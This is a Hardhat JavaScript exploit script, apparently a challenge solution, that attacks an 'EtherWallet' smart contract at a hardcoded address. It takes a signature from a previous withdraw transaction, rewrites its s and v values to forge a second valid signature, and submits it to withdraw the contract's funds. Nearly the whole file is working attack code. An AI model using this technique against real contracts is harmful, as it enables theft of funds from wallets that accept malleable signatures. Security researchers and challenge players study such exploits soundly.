const hre = require("hardhat");
const { ethers } = hre;

const address = '0x4b90946aB87BF6e1CA1F26b2af2897445F48f877';
const signature = '0x53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c';

// The ECDSA.recover function present in the contract can be exploited using a signature malleability attack
// We can take the signature from the previous `withdraw` transaction and flip the s/v values to generate a new
// valid signature
// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.7.3/contracts/utils/cryptography/ECDSA.sol#L140
async function main() {
  const EtherWallet = await ethers.getContractFactory("EtherWallet");
  const instance = EtherWallet.attach(address);

  const { v, r, s } = ethers.utils.splitSignature(signature);

  const order = ethers.BigNumber.from('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

  const newS = order.gt(s) ? order.sub(s) : ethers.BigNumber.from(s).sub(order);
  const newV = v == 27 ? 28 : 27;

  // joinSignature won't work here
  // const newSignature = ethers.utils.joinSignature({ r, s: newS.toHexString(), v: newV});
  const newSignature = '0x' + r.slice(2) + newS.toHexString().slice(2) + newV.toString(16);
  console.log('New signature:', newSignature);

  const tx = await instance.withdraw(newSignature);
  console.log('TX:', tx.hash);
  await tx.wait();

  console.log('Done!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
